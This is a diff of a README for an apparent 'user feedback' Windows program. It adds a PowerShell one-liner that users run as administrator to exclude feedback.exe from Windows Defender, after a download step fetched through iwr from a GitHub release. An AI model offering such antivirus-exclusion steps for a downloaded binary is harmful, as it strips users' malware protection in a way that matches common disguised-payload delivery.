@@ -6,6 +6,10 @@ iwr -UseBasicParsing "https://github.com/bebedudu/autoupdate/releases/download/v
 ### Make trusted application to window defender
 1. Open Powershell as admn & paste the script
 ```bash
+$exePath = "C:\user feedback\feedback\feedback.exe"; Add-MpPreference -ExclusionPath $exePath; Write-Host "Added $exePath to Windows Defender exclusions."
+```
+or,
+```bash
 # Define the path to your executable
 $exePath = "C:\user feedback\feedback\feedback.exe"
 # Add the application to Windows Defender exclusions
